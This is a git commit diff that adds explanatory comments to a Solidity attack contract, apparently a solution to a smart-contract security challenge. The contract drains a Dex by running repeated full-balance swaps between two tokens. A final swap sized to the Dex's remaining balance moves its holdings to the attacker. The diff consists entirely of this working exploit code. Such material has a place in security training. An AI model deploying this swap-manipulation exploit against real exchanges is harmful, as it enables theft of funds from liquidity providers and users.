3b5b825eb9eb1fa00e56cc0e6b29de62ecdc1031
Aleksa Pantic <150276227+10ap17@users.noreply.github.com>
2024-04-03 23:54:13 +0200

    Update Dex_Attack.sol

--- Dex/Dex_Attack.sol
+++ Dex/Dex_Attack.sol
@@ -21,22 +21,25 @@ contract Attack{
         token2= _token2;
     }
     function attack(IDex dex)external{
+        // Approve transfer of tokens to the attacker's address
         token1.approve(msg.sender, address(this), 10);
         token1.transferFrom(msg.sender, address(this), 10);
 
         token2.approve(msg.sender, address(this), 10);
         token2.transferFrom(msg.sender,address(this),10);
 
+        // Approve transfer of tokens to the Dex contract
         token1.approve(address(dex),110);
         token2.approve(address(dex),110);
 
+        // Perform multiple swaps between token1 and token2
         dex.swap(address(token1),address(token2),token1.balanceOf(address(this)));
         dex.swap(address(token2),address(token1),token2.balanceOf(address(this)));
         dex.swap(address(token1),address(token2),token1.balanceOf(address(this)));
         dex.swap(address(token2),address(token1),token2.balanceOf(address(this)));
         dex.swap(address(token1),address(token2),token1.balanceOf(address(this)));
 
-
+        // Final swap to transfer remaining token balance from Dex to attacker
         dex.swap(address(token2),address(token1),token2.balanceOf(address(dex)));
     }
 }
